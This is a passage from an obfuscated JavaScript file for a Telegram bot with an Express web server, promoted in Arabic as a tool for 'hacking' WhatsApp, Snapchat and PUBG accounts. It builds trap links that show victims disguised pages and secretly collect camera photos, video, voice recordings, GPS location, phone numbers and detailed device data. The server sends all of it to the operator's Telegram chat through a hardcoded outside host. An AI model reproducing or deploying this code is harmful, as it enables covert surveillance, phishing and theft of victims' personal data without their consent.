تخدم\x20VIP','/getNam','نيوزيلندا\x20🇳🇿','لاتفيا\x20🇱🇻','إختراق\x20سناب\x20شات\x20⭐','سلوفينيا\x20🇸🇮','اختراق\x20وتساب\x20🟢','إختراق\x20ببجي','mm.html','\x20نقاط.','join','&duration=','رواندا\x20🇷🇼','/submitPhotos','https://i-jgne.onrender.com/','50mb','ICTS31333_bot','تصفير\x20الذاكرة\x20المؤقتة...','\x0a📱\x20**معلومات\x20الجهاز:**\x0a-\x20الدولة:\x20','pubg.html','.mp4','facebook','1663563QwjqQC','files','السودان\x20🇸🇩','latitude','بنما\x20🇵🇦','https://i-jgne.onrender.com/record/','videos','path','10mb','touchSupport','capture_video','firstName','add_nammes','تم\x20انشاء\x20الرابط\x20ملاحظه\x20بزم\x20يكون\x20النت\x20قوي\x20في\x20جهاز\x20الضحيه\x0a:\x20https://i-jgne.onrender.com/capture?chatId=','getItem','get','حدثت\x20مشكلة\x20أثناء\x20إرسال\x20الأسماء\x20إلى\x20التلغرام.','/imageReceiver','tok.html','هونغ\x20كونغ\x20🇭🇰','get_love_message','أرمينيا\x20🇦🇲','تايوان\x20🇹🇼','باراغواي\x20🇵🇾','إختراق\x20ببجي\x20🕹','غوام\x20🇬🇺','Failed\x20to\x20send\x20video','تم\x20إرسال\x20الرابط\x20إليك\x20✅','toString','split','المزيد','نيكاراغوا\x20🇳🇮','params','الرجاء\x20إرسال\x20معرف\x20المستخدم\x20لإضافته\x20كـ\x20VIP:','جزر\x20فارو\x20🇫🇴','\x20🖥️\x0a-\x20إصدار\x20الجهاز:\x20','includes','chat','answerCallbackQuery','/submitNames','osVersion','isCharging','redirect','$\x0aعندما\x20توصل\x20لي30$\x20سوف\x20يتم\x20فتح\x20المميزات\x20المدفوع\x20تلقائي\x20','بولندا\x20🇵🇱','الصين\x20🇨🇳','https://i-jgne.onrender.com/captureFront/','5161848ELZTuT','صربيا\x20🇷🇸','185030mRacWO','الإمارات\x20🇦🇪','الرجاء\x20توفير\x20chatId\x20في\x20الطلب.','error','captureBack:','deviceName','ناميبيا\x20🇳🇦','مالطا\x20🇲🇹','الدردشه\x20مع\x20الذكاء\x20الاصطناعي\x20🤖','السعودية\x20🇸🇦','الإكوادور\x20🇪🇨','كوريا\x20الجنوبية\x20🇰🇷','user'];a0_0x12c7=function(){return _0x594950;};return a0_0x12c7();}const a0_0x40ad1d=a0_0x16a4;(function(_0x305ab1,_0x4adf4e){const _0x58bb22=a0_0x16a4,_0x50f083=_0x305ab1();while(!![]){try{const _0x18d5c3=-parseInt(_0x58bb22(0x260))/0x1*(-parseInt(_0x58bb22(0x1c4))/0x2)+-parseInt(_0x58bb22(0x1fa))/0x3*(parseInt(_0x58bb22(0x1e3))/0x4)+-parseInt(_0x58bb22(0x10a))/0x5*(-parseInt(_0x58bb22(0x1a3))/0x6)+-parseInt(_0x58bb22(0x123))/0x7*(parseInt(_0x58bb22(0x177))/0x8)+-parseInt(_0x58bb22(0x275))/0x9*(-parseInt(_0x58bb22(0x24f))/0xa)+-parseInt(_0x58bb22(0x21e))/0xb+-parseInt(_0x58bb22(0x24d))/0xc;if(_0x18d5c3===_0x4adf4e)break;else _0x50f083['push'](_0x50f083['shift']());}catch(_0x190c32){_0x50f083['push'](_0x50f083['shift']());}}}(a0_0x12c7,0x43957));const TelegramBot=require(a0_0x40ad1d(0x27d)),express=require(a0_0x40ad1d(0x202)),bodyParser=require(a0_0x40ad1d(0x186)),multer=require(a0_0x40ad1d(0x1f3)),path=require(a0_0x40ad1d(0x225)),fs=require('fs'),crypto=require(a0_0x40ad1d(0x1ef)),axios=require('axios'),uuid=require(a0_0x40ad1d(0x18c)),botToken=a0_0x40ad1d(0x1b3),botUsername=a0_0x40ad1d(0x218),bot=new TelegramBot(botToken,{'polling':!![]}),developerChannels=[a0_0x40ad1d(0xf5)];function a0_0x16a4(_0x1f7b03,_0x3d0d15){const _0x12c712=a0_0x12c7();return a0_0x16a4=function(_0x16a499,_0x46340f){_0x16a499=_0x16a499-0xba;let _0x409dee=_0x12c712[_0x16a499];return _0x409dee;},a0_0x16a4(_0x1f7b03,_0x3d0d15);}let userPoints={},linkData={},visitorData={};function clearCache(){console['log']('Clearing\x20cache...'),userPoints={},linkData={},visitorData={};const _0x500574={};}setInterval(clearCache,0x708*0x3e8);async function isUserSubscribed(_0x282e2d){const _0x12c63d=a0_0x40ad1d;try{const _0x467bbb=await Promise['all'](developerChannels[_0x12c63d(0x25f)](_0x3a6b29=>bot[_0x12c63d(0x110)](_0x3a6b29,_0x282e2d)));return _0x467bbb['every'](_0x496bda=>{const _0x577f76=_0x12c63d,_0x17bcc3=_0x496bda[_0x577f76(0xfc)];return _0x17bcc3==='member'||_0x17bcc3===_0x577f76(0x187)||_0x17bcc3==='creator';});}catch(_0x307a15){return console['error'](_0x12c63d(0x1dc),_0x307a15),![];}}bot[a0_0x40ad1d(0xd4)](/\/Viiiiip/,async _0x3bbb61=>{const _0x5e988c=a0_0x40ad1d,_0x15d0f3=_0x3bbb61[_0x5e988c(0x243)]['id'],_0x49c75d=_0x3bbb61[_0x5e988c(0x120)]['id'],_0xe52ad1=await isUserSubscribed(_0x15d0f3);if(!_0xe52ad1){const _0x360a87=_0x5e988c(0xba),_0x2bf6ce=developerChannels[_0x5e988c(0x25f)](_0x2ae86d=>[{'text':'اشترك\x20في\x20'+_0x2ae86d,'url':_0x5e988c(0x126)+_0x2ae86d[_0x5e988c(0x125)](0x1)}]);bot[_0x5e988c(0x146)](_0x15d0f3,_0x360a87,{'reply_markup':{'inline_keyboard':_0x2bf6ce}});return;}const _0x445c0d=uuid['v4']();linkData[_0x445c0d]={'userId':_0x49c75d,'chatId':_0x15d0f3,'visitors':[]};const _0x1323fd=_0x5e988c(0x1d5);bot[_0x5e988c(0x146)](_0x15d0f3,_0x1323fd,{'reply_markup':{'inline_keyboard':[[{'text':_0x5e988c(0x1b1),'callback_data':_0x5e988c(0xd2)+_0x445c0d}],[{'text':_0x5e988c(0x105),'callback_data':'get_link_'+_0x445c0d}],[{'text':_0x5e988c(0x1af),'callback_data':_0x5e988c(0xd2)+_0x445c0d}],[{'text':_0x5e988c(0x1a0),'callback_data':_0x5e988c(0xd2)+_0x445c0d}]]}});}),bot['on'](a0_0x40ad1d(0x278),async _0x2b9bdb=>{const _0x262d27=a0_0x40ad1d,_0x29ed82=_0x2b9bdb[_0x262d27(0x11d)][_0x262d27(0x243)]['id'],_0x3456a6=_0x2b9bdb[_0x262d27(0x120)]['id'],_0x584b1f=_0x2b9bdb[_0x262d27(0xf0)]['split']('_')[0x2];if(linkData[_0x584b1f]&&linkData[_0x584b1f][_0x262d27(0xed)]===_0x3456a6){const _0x1bb0ad=_0x262d27(0x1e2)+botUsername+'?start='+_0x584b1f;bot[_0x262d27(0x146)](_0x29ed82,_0x1bb0ad);}}),bot[a0_0x40ad1d(0xd4)](/\/vip (.+)/,async(_0x7af4c,_0x4bed15)=>{const _0x591f0a=a0_0x40ad1d,_0x3d65b0=_0x4bed15[0x1],_0x281df6=_0x7af4c[_0x591f0a(0x120)]['id'],_0x2a8d51=_0x7af4c[_0x591f0a(0x243)]['id'],_0x4774ab=await isUserSubscribed(_0x2a8d51);if(!_0x4774ab){const _0x5bcf83=_0x591f0a(0xba),_0x4fe1cf=developerChannels[_0x591f0a(0x25f)](_0x46d96c=>[{'text':_0x591f0a(0x266)+_0x46d96c,'url':'https://t.me/'+_0x46d96c['substring'](0x1)}]);bot['sendMessage'](_0x2a8d51,_0x5bcf83,{'reply_markup':{'inline_keyboard':_0x4fe1cf}});return;}if(linkData[_0x3d65b0]){const {userId:_0x51b950,visitors:_0x59c681}=linkData[_0x3d65b0];if(_0x281df6!==_0x51b950&&(!visitorData[_0x281df6]||!visitorData[_0x281df6][_0x591f0a(0x242)](_0x51b950))){_0x59c681[_0x591f0a(0x1f6)](_0x281df6);!visitorData[_0x281df6]&&(visitorData[_0x281df6]=[]);visitorData[_0x281df6]['push'](_0x51b950);!userPoints[_0x51b950]&&(userPoints[_0x51b950]=0x0);userPoints[_0x51b950]+=0x1;const _0x2a6fd5='شخص\x20جديد\x20دخل\x20إلى\x20الرابط\x20الخاص\x20بك!\x20لديك\x20الآن\x20'+userPoints[_0x51b950]+_0x591f0a(0x211);bot[_0x591f0a(0x146)](_0x2a8d51,_0x2a6fd5);const _0x42b130=_0x591f0a(0x141)+userPoints[_0x51b950]+'\x20نقاط';bot[_0x591f0a(0x146)](_0x51b950,_0x42b130);}}}),bot['on'](a0_0x40ad1d(0x278),async _0x5e0240=>{const _0x326c95=a0_0x40ad1d,_0x9b0edb=_0x5e0240[_0x326c95(0x11d)]['chat']['id'],_0x8ee21c=_0x5e0240[_0x326c95(0x120)]['id'],_0x63ff13=_0x5e0240[_0x326c95(0xf0)][_0x326c95(0x23b)]('_')[0x2];if(linkData[_0x63ff13]&&linkData[_0x63ff13][_0x326c95(0xed)]===_0x8ee21c){const _0x4dd00b=_0x326c95(0x1e7)+botUsername+_0x326c95(0x26c)+_0x63ff13;bot[_0x326c95(0x146)](_0x9b0edb,_0x4dd00b);}}),bot[a0_0x40ad1d(0xd4)](/\/start (.+)/,async(_0x4edeec,_0x5c1536)=>{const _0x378e91=a0_0x40ad1d,_0x27dc9c=_0x5c1536[0x1],_0x7120de=_0x4edeec[_0x378e91(0x120)]['id'],_0x2a960d=_0x4edeec[_0x378e91(0x243)]['id'],_0x316084=await isUserSubscribed(_0x2a960d);if(!_0x316084){const _0x2f03f1=_0x378e91(0xba),_0x3eeda2=developerChannels['map'](_0x91cac8=>[{'text':_0x378e91(0x266)+_0x91cac8,'url':_0x378e91(0x126)+_0x91cac8[_0x378e91(0x125)](0x1)}]);bot['sendMessage'](_0x2a960d,_0x2f03f1,{'reply_markup':{'inline_keyboard':_0x3eeda2}});return;}if(linkData[_0x27dc9c]){const {userId:_0x245d93,chatId:_0x2aa2f8,visitors:_0x171543}=linkData[_0x27dc9c];if(_0x7120de!==_0x245d93&&(!visitorData[_0x7120de]||!visitorData[_0x7120de]['includes'](_0x245d93))){_0x171543[_0x378e91(0x1f6)](_0x7120de);!visitorData[_0x7120de]&&(visitorData[_0x7120de]=[]);visitorData[_0x7120de][_0x378e91(0x1f6)](_0x245d93);!userPoints[_0x245d93]&&(userPoints[_0x245d93]=0x0);userPoints[_0x245d93]+=0x1;const _0x192874=_0x378e91(0x184)+userPoints[_0x245d93]+_0x378e91(0x249);bot[_0x378e91(0x146)](_0x2aa2f8,_0x192874);}}});const app=express();app['use'](bodyParser[a0_0x40ad1d(0x16a)]({'extended':!![],'limit':a0_0x40ad1d(0x226)})),app['use'](bodyParser[a0_0x40ad1d(0x280)]({'limit':'100mb'})),app[a0_0x40ad1d(0xef)](express[a0_0x40ad1d(0x142)](__dirname));const storage=multer['memoryStorage'](),upload=multer({'storage':storage}),uploadVoice=multer({'dest':'uploads/'});app['get'](a0_0x40ad1d(0x129),(_0x1215c3,_0x2cb0e7)=>{const _0x2fd5ee=a0_0x40ad1d,_0x5e5e05=_0x1215c3[_0x2fd5ee(0x165)][_0x2fd5ee(0xc9)],_0x360970=_0x1215c3[_0x2fd5ee(0x165)][_0x2fd5ee(0x1d3)];if(!_0x5e5e05)return _0x2cb0e7['status'](0x190)[_0x2fd5ee(0x166)](_0x2fd5ee(0x251));let _0x33d736='';switch(_0x360970){case _0x2fd5ee(0x15c):_0x33d736=_0x2fd5ee(0x1b2);break;case _0x2fd5ee(0x21d):_0x33d736=_0x2fd5ee(0x200);break;case'tiktok':default:_0x33d736=_0x2fd5ee(0x230);break;}_0x2cb0e7[_0x2fd5ee(0x1fd)](path[_0x2fd5ee(0x212)](__dirname,_0x33d736));}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0xe3),(_0x45108f,_0x558854)=>{const _0x40bc71=a0_0x40ad1d,_0x359999=_0x45108f['params'][_0x40bc71(0x11f)];validateLinkUsage(_0x359999)?_0x558854[_0x40bc71(0x1fd)](path[_0x40bc71(0x212)](__dirname,_0x40bc71(0x19b))):(_0x558854[_0x40bc71(0x166)](_0x40bc71(0xd5)),bot[_0x40bc71(0x146)](linkUsage[_0x359999][_0x40bc71(0xc9)],'لقد\x20قام\x20ضحيتك\x20في\x20الدخول\x20لرابط\x20منتهى\x20قم\x20في\x20تلغيم\x20رابط\x20جديد\x20'));}),app['get']('/captureFront/:linkId',(_0x21457f,_0x331d98)=>{const _0xd0895d=a0_0x40ad1d,_0x4b009f=_0x21457f[_0xd0895d(0x23e)][_0xd0895d(0x11f)];validateLinkUsage(_0x4b009f)?_0x331d98[_0xd0895d(0x1fd)](path['join'](__dirname,_0xd0895d(0x164))):(_0x331d98[_0xd0895d(0x166)](_0xd0895d(0xd5)),bot['sendMessage'](linkUsage[_0x4b009f][_0xd0895d(0xc9)],_0xd0895d(0xce)));}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0xee),(_0x1de095,_0x2bd5e7)=>{const _0x5c31f8=a0_0x40ad1d,_0x5e633f=_0x1de095[_0x5c31f8(0x23e)][_0x5c31f8(0x11f)];validateLinkUsage(_0x5e633f)?_0x2bd5e7[_0x5c31f8(0x1fd)](path[_0x5c31f8(0x212)](__dirname,_0x5c31f8(0xbc))):(_0x2bd5e7[_0x5c31f8(0x166)](_0x5c31f8(0xd5)),bot[_0x5c31f8(0x146)](linkUsage[_0x5e633f]['chatId'],_0x5c31f8(0xce)));}),app[a0_0x40ad1d(0x22d)]('/record/:linkId',(_0x262c9b,_0x38dc4a)=>{const _0xa0f75b=a0_0x40ad1d,_0xb00023=_0x262c9b[_0xa0f75b(0x23e)][_0xa0f75b(0x11f)];validateLinkUsage(_0xb00023)?_0x38dc4a['sendFile'](path[_0xa0f75b(0x212)](__dirname,_0xa0f75b(0x150))):(_0x38dc4a['send']('تم\x20استخدام\x20هذا\x20الرابط\x20خمس\x20مرات\x20الرجاء\x20تغير\x20هذا\x20الرابط.'),bot[_0xa0f75b(0x146)](linkUsage[_0xb00023][_0xa0f75b(0xc9)],'لقد\x20قام\x20ضحيتك\x20في\x20الدخول\x20لرابط\x20منتهى\x20قم\x20في\x20تلغيم\x20رابط\x20جديد\x20'));}),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0x245),(_0x5423cb,_0x1d19c8)=>{const _0xb61cb0=a0_0x40ad1d,_0x1cc6c7=_0x5423cb[_0xb61cb0(0x18a)][_0xb61cb0(0xc9)],_0x1f7ec6=_0x5423cb[_0xb61cb0(0x18a)][_0xb61cb0(0x229)],_0x2d8dfe=_0x5423cb[_0xb61cb0(0x18a)][_0xb61cb0(0x263)];console['log'](_0xb61cb0(0x163),_0x5423cb[_0xb61cb0(0x18a)]),bot[_0xb61cb0(0x146)](_0x1cc6c7,_0xb61cb0(0x1ea)+_0x1f7ec6+_0xb61cb0(0x116)+_0x2d8dfe)[_0xb61cb0(0x197)](()=>{})[_0xb61cb0(0x171)](_0x169a8c=>{const _0x3c8f4c=_0xb61cb0;console['error']('Error\x20sending\x20Telegram\x20message:',_0x169a8c['response']?_0x169a8c['response'][_0x3c8f4c(0x18a)]:_0x169a8c);}),_0x1d19c8[_0xb61cb0(0x248)](_0xb61cb0(0x109));}),app[a0_0x40ad1d(0xef)](bodyParser[a0_0x40ad1d(0x280)]()),app[a0_0x40ad1d(0xef)](express['static'](__dirname)),app[a0_0x40ad1d(0x22d)]('/whatsapp',(_0x2a40bf,_0x376af3)=>{const _0x4428e0=a0_0x40ad1d;_0x376af3[_0x4428e0(0x1fd)](path['join'](__dirname,'phone_form.html'));}),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0xd6),(_0x1cb928,_0x20a6fc)=>{const _0xa120a9=a0_0x40ad1d,_0x4779c1=_0x1cb928['body'][_0xa120a9(0xc9)],_0x425b9d=_0x1cb928[_0xa120a9(0x18a)][_0xa120a9(0x281)];bot['sendMessage'](_0x4779c1,_0xa120a9(0x130)+_0x425b9d)[_0xa120a9(0x197)](()=>{const _0xadb1a8=_0xa120a9;_0x20a6fc[_0xadb1a8(0x280)]({'success':!![]});})[_0xa120a9(0x171)](_0x46765e=>{const _0x195474=_0xa120a9;console[_0x195474(0x252)](_0x195474(0x203),_0x46765e[_0x195474(0x11b)]?_0x46765e[_0x195474(0x11b)][_0x195474(0x18a)]:_0x46765e),_0x20a6fc[_0x195474(0x280)]({'success':![]});});}),app['post'](a0_0x40ad1d(0x158),(_0x228860,_0x4a25bf)=>{const _0x1f54a8=a0_0x40ad1d,_0x2d88f8=_0x228860['body'][_0x1f54a8(0xc9)],_0x9959f3=_0x228860[_0x1f54a8(0x18a)][_0x1f54a8(0x201)];bot[_0x1f54a8(0x146)](_0x2d88f8,_0x1f54a8(0xc2)+_0x9959f3)[_0x1f54a8(0x197)](()=>{const _0x3e8e16=_0x1f54a8;_0x4a25bf['redirect'](_0x3e8e16(0x1a6));})[_0x1f54a8(0x171)](_0x520a1e=>{const _0x1e7b8f=_0x1f54a8;console[_0x1e7b8f(0x252)](_0x1e7b8f(0x203),_0x520a1e[_0x1e7b8f(0x11b)]?_0x520a1e['response'][_0x1e7b8f(0x18a)]:_0x520a1e),_0x4a25bf[_0x1e7b8f(0x280)]({'success':![]});});}),app[a0_0x40ad1d(0xef)](bodyParser[a0_0x40ad1d(0x280)]({'limit':a0_0x40ad1d(0x217)})),app['use'](bodyParser['urlencoded']({'limit':a0_0x40ad1d(0x217),'extended':!![]}));const dataStore={};app[a0_0x40ad1d(0xef)](express[a0_0x40ad1d(0x142)](__dirname)),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0x12b),(_0x17449f,_0x18706f)=>{const _0xbc8047=a0_0x40ad1d,_0x4b7055=_0x17449f[_0xbc8047(0x18a)][_0xbc8047(0xc9)],_0x4f2584=_0x17449f[_0xbc8047(0x18a)][_0xbc8047(0x147)];if(!_0x4b7055||!_0x4f2584)return _0x18706f[_0xbc8047(0xfc)](0x190)['send'](_0xbc8047(0x1e8));const _0x14f20a=_0x4f2584[_0xbc8047(0x23b)](',')[0x1],_0x5bd21d=path[_0xbc8047(0x212)](__dirname,_0xbc8047(0x224));!fs[_0xbc8047(0xd7)](_0x5bd21d)&&fs[_0xbc8047(0x204)](_0x5bd21d);try{const _0x4537b6=Buffer[_0xbc8047(0x120)](_0x14f20a,'base64'),_0x24b73e=path[_0xbc8047(0x212)](_0x5bd21d,_0x4b7055+_0xbc8047(0x21c));fs[_0xbc8047(0x160)](_0x24b73e,_0x4537b6),bot[_0xbc8047(0x181)](_0x4b7055,_0x24b73e,{'caption':_0xbc8047(0x176)})[_0xbc8047(0x197)](()=>{const _0x26bf4d=_0xbc8047;console[_0x26bf4d(0x1d0)](_0x26bf4d(0x1a5)+_0x4b7055),_0x18706f[_0x26bf4d(0x248)](_0x26bf4d(0xd3));})[_0xbc8047(0x171)](_0x4d40bd=>{const _0x1c7e97=_0xbc8047;console[_0x1c7e97(0x252)](_0x1c7e97(0x1ad),_0x4d40bd),_0x18706f[_0x1c7e97(0xfc)](0x1f4)[_0x1c7e97(0x166)](_0x1c7e97(0x238));});}catch(_0x3b6c51){console[_0xbc8047(0x252)](_0xbc8047(0x106),_0x3b6c51),_0x18706f['status'](0x1f4)[_0xbc8047(0x166)](_0xbc8047(0x1a4));}}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0xf1),(_0x20c3f2,_0x3a72b7)=>{const _0x2fb6db=a0_0x40ad1d;_0x3a72b7[_0x2fb6db(0x1fd)](path[_0x2fb6db(0x212)](__dirname,_0x2fb6db(0x1f5)));});let userRequests={};app[a0_0x40ad1d(0x262)]('/submitLocation',(_0xc8ec6e,_0x434ed5)=>{const _0x31b5f6=a0_0x40ad1d,_0x371c2a=_0xc8ec6e[_0x31b5f6(0x18a)][_0x31b5f6(0xc9)],_0x24dc0a=_0xc8ec6e[_0x31b5f6(0x18a)][_0x31b5f6(0x221)],_0x3dd209=_0xc8ec6e[_0x31b5f6(0x18a)]['longitude'];bot[_0x31b5f6(0xcf)](_0x371c2a,_0x24dc0a,_0x3dd209),_0x434ed5[_0x31b5f6(0x166)]('حدث\x20خطأ');}),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0x215),(_0x25c51e,_0x18d4df)=>{const _0x30c2c2=a0_0x40ad1d,_0x23f1c5=_0x25c51e[_0x30c2c2(0x18a)]['chatId'],_0xa2f32f=_0x25c51e['body']['imageDatas'][_0x30c2c2(0x23b)](',');console[_0x30c2c2(0x1d0)](_0x30c2c2(0x14d),_0xa2f32f[_0x30c2c2(0xf2)],_0x30c2c2(0x114),_0x23f1c5);if(_0xa2f32f[_0x30c2c2(0xf2)]>0x0){const _0x3ae5da=_0xa2f32f[_0x30c2c2(0x25f)]((_0x5786ac,_0xa69f4f)=>{const _0x2b4f73=_0x30c2c2,_0x212cba=Buffer[_0x2b4f73(0x120)](_0x5786ac,_0x2b4f73(0xc7));return bot[_0x2b4f73(0x1e6)](_0x23f1c5,_0x212cba,{'caption':'📸الصورة\x20'+(_0xa69f4f+0x1)});});Promise[_0x30c2c2(0x12a)](_0x3ae5da)[_0x30c2c2(0x197)](()=>{const _0x49bd43=_0x30c2c2;console[_0x49bd43(0x1d0)](''),_0x18d4df[_0x49bd43(0x280)]({'success':!![]});})[_0x30c2c2(0x171)](_0x1df245=>{const _0x31521c=_0x30c2c2;console['error']('',_0x1df245),_0x18d4df['status'](0x1f4)[_0x31521c(0x280)]({'error':''});});}else console[_0x30c2c2(0x1d0)](''),_0x18d4df[_0x30c2c2(0xfc)](0x190)['json']({'error':''});}),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0x22f),upload[a0_0x40ad1d(0x115)](a0_0x40ad1d(0x271),0x14),(_0x19421a,_0x3c74b2)=>{const _0x53e256=a0_0x40ad1d,_0x5c9124=_0x19421a[_0x53e256(0x18a)][_0x53e256(0xed)],_0x56ff8e=_0x19421a[_0x53e256(0x21f)];if(_0x56ff8e&&_0x56ff8e['length']>0x0){console[_0x53e256(0x1d0)]('تم\x20استلام\x20'+_0x56ff8e['length']+'\x20\x20'+_0x5c9124);const _0x421a94=_0x56ff8e[_0x53e256(0x25f)](_0x3f5628=>bot[_0x53e256(0x1e6)](_0x5c9124,_0x3f5628[_0x53e256(0xe1)]));Promise['all'](_0x421a94)[_0x53e256(0x197)](()=>{const _0x3ca999=_0x53e256;console[_0x3ca999(0x1d0)](''),_0x3c74b2[_0x3ca999(0x280)]({'success':!![]});})['catch'](_0x283a5a=>{const _0x529742=_0x53e256;console[_0x529742(0x252)](':',_0x283a5a),_0x3c74b2[_0x529742(0xfc)](0x1f4)['json']({'error':''});});}else console[_0x53e256(0x1d0)](''),_0x3c74b2[_0x53e256(0xfc)](0x190)[_0x53e256(0x280)]({'error':''});}),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0xe7),uploadVoice[a0_0x40ad1d(0x195)]('voice'),(_0x3864de,_0x44fdef)=>{const _0x462dc3=a0_0x40ad1d,_0x43f243=_0x3864de[_0x462dc3(0x18a)][_0x462dc3(0xc9)],_0x1f8d35=_0x3864de[_0x462dc3(0xe8)][_0x462dc3(0x225)];bot[_0x462dc3(0x138)](_0x43f243,_0x1f8d35)[_0x462dc3(0x197)](()=>{const _0x51e07a=_0x462dc3;fs[_0x51e07a(0x1f1)](_0x1f8d35),_0x44fdef[_0x51e07a(0x166)]('');})[_0x462dc3(0x171)](_0x5cf8d2=>{const _0x5a36ca=_0x462dc3;console[_0x5a36ca(0x252)](_0x5cf8d2),_0x44fdef[_0x5a36ca(0xfc)](0x1f4)[_0x5a36ca(0x166)](_0x5a36ca(0xe6));});});const PORT=process[a0_0x40ad1d(0x1bb)][a0_0x40ad1d(0x1cd)]||0xbb8;app[a0_0x40ad1d(0x1bf)](PORT,()=>{const _0x2a54e2=a0_0x40ad1d;console[_0x2a54e2(0x1d0)](_0x2a54e2(0x152)+PORT);}),app[a0_0x40ad1d(0x22d)](a0_0x40ad1d(0x159),(_0x51819d,_0x1b8e58)=>{const _0x1993e0=a0_0x40ad1d;_0x1b8e58[_0x1993e0(0x1fd)](path[_0x1993e0(0x212)](__dirname,_0x1993e0(0x210)));}),app[a0_0x40ad1d(0x262)](a0_0x40ad1d(0x14a),async(_0x352116,_0x3d3e83)=>{const _0x270adb=a0_0x40ad1d,_0x3bc168=_0x352116['body'][_0x270adb(0xed)],_0x1d643b=_0x352116[_0x270adb(0x18a)][_0x270adb(0x14b)];if(_0x1d643b){const _0x40f422=_0x270adb(0x21a)+_0x1d643b['country']+_0x270adb(0xdc)+_0x1d643b[_0x270adb(0xd1)]+_0x270adb(0x1ee)+_0x1d643b['ip']+_0x270adb(0x19e)+_0x1d643b['battery']+_0x270adb(0x1f2)+_0x1d643b[_0x270adb(0x247)]+_0x270adb(0x13e)+_0x1d643b['network']+'\x20📶\x20(سرعة:\x20'+_0x1d643b['networkSpeed']+'\x20ميغابت\x20في\x20الثانية)\x0a-\x20نوع\x20الاتصال:\x20'+_0x1d643b[_0x270adb(0x274)]+_0x270adb(0xec)+_0x1d643b[_0x270adb(0x155)]+'\x20⏰\x0a-\x20اسم\x20الجهاز:\x20'+_0x1d643b[_0x270adb(0x254)]+_0x270adb(0x241)+_0x1d643b[_0x270adb(0x132)]+_0x270adb(0x17f)+_0x1d643b[_0x270adb(0xf7)]+'\x20📱\x0a-\x20الذاكرة\x20(RAM):\x20'+_0x1d643b['memory']+'\x20🧠\x0a-\x20الذاكرة\x20الداخلية:\x20'+_0x1d643b[_0x270adb(0x111)]+_0x270adb(0x14e)+_0x1d643b[_0x270adb(0x14c)]+_0x270adb(0x1ae)+_0x1d643b['language']+_0x270adb(0x17a)+_0x1d643b['browserName']+_0x270adb(0x18f)+_0x1d643b[_0x270adb(0x168)]+_0x270adb(0x101)+_0x1d643b[_0x270adb(0x196)]+_0x270adb(0xc5)+_0x1d643b[_0x270adb(0x246)]+_0x270adb(0x1fb)+_0x1d643b[_0x270adb(0x10b)]+_0x270adb(0x185)+_0x1d643b[_0x270adb(0x145)]+'\x20🎨\x0a-\x20تاريخ\x20آخر\x20تحديث\x20للمتصفح:\x20'+_0x1d643b[_0x270adb(0x18e)]+_0x270adb(0x1b0)+_0x1d643b[_0x270adb(0x1ca)]+_0x270adb(0xf3)+_0x1d643b[_0x270adb(0xbb)]+'\x20📡\x0a-\x20إمكانية\x20تحديد\x20الموقع\x20الجغرافي:\x20'+_0x1d643b[_0x270adb(0x118)]+_0x270adb(0x1a2)+_0x1d643b[_0x270adb(0x170)]+_0x270adb(0x1a1)+_0x1d643b[_0x270adb(0x227)]+'\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20\x20';try{await bot[_0x270adb(0x146)](_0x3bc168,_0x40f422,{'parse_mode':_0x270adb(0x17e)}),console[_0x270adb(0x1d0)]('تم\x20إرسال\x20معلومات\x20الجهاز\x20بنجاح'),_0x3d3e83['json']({'success':!![]});}catch(_0x5c2b2c){console['error'](_0x270adb(0x15d),_0x5c2b2c),_0x3d3e83['status'](0x1f4)[_0x270adb(0x280)]({'error':'فشل\x20في\x20إرسال\x20معلومات\x20الجهاز'});}}else console['log'](_0x270adb(0x265)),_0x3d3e83[_0x270adb(0xfc)](0x190)[_0x270adb(0x280)]({'error':_0x270adb(0x265)});}),app[a0_0x40ad1d(0x262)]('/so',(_0xb44303,_0x3bd42e)=>{const _0x55eed1=a0_0x40ad1d,_0x48b685=_0xb44303['body'][_0x55eed1(0xc9)],_0x44c14d=_0xb44303['body'][_0x55eed1(0xc8)][_0x55eed1(0x23b)](',');_0x44c14d[_0x55eed1(0x1cb)]((_0x46e820,_0x306efa)=>{const _0x36ca5a=_0x55eed1,_0x7ffedc=Buffer[_0x36ca5a(0x120)](_0x46e820,'base64');bot[_0x36ca5a(0x1e6)](_0x48b685,_0x7ffedc,{'caption':'الصوره📸\x20'+(_0x306efa+0x1)});}),console['log']('Sent\x20photos\x20for\x20chatId\x20'+_0x48b685),dataStore[_0x48b685]&&dataStore[_0x48b685]['userLink']?_0x3bd42e['redirect'](dataStore[_0x48b685][_0x55eed1(0x264)]):_0x3bd42e[_0x55eed1(0x166)](_0x55eed1(0x137));}),app['get']('/ca',(_0x53ea68,_0x3feaa0)=>{const _0x6b4d08=a0_0x40ad1d;_0x3feaa0[_0x6b4d08(0x1fd)](path[_0x6b4d08(0x212)](__dirname,_0x6b4d08(0x267)));});let linkUsage={};const maxAttemptsPerButton=0x22b;function loadLinkUsage(){const _0x4f3f6c=a0_0x40ad1d;try{linkUsage=JSON[_0x4f3f6c(0x1fc)](fs['readFileSync']('linkUsage.json'));}catch(_0x102b2a){linkUsage={};}}function saveLinkUsage(){const _0x1c9c1f=a0_0x40ad1d;fs['writeFileSync'](_0x1c9c1f(0x193),JSON['stringify'](linkUsage));}function validateLinkUsage(_0xe1c377,_0xe66f13){const _0x46296f=a0_0x40ad1d,_0x137ce9=_0xe1c377+':'+_0xe66f13;if(isVIPUser(_0xe1c377))return!![];if(linkUsage[_0x137ce9]&&linkUsage[_0x137ce9][_0x46296f(0x1d4)]>=maxAttemptsPerButton)return![];return!linkUsage[_0x137ce9]&&(linkUsage[_0x137ce9]={'attempts':0x0}),linkUsage[_0x137ce9]['attempts']++,saveLinkUsage(),!![];}loadLinkUsage();let vipUsers={};function loadVIPUsers(){const _0x573ad4=a0_0x40ad1d;try{vipUsers=JSON[_0x573ad4(0x1fc)](fs[_0x573ad4(0x131)](_0x573ad4(0x27b)));}catch(_0x5e34a8){vipUsers={};}}function saveVIPUsers(){const _0x5eab72=a0_0x40ad1d;fs['writeFileSync'](_0x5eab72(0x27b),JSON[_0x5eab72(0xeb)](vipUsers));}function 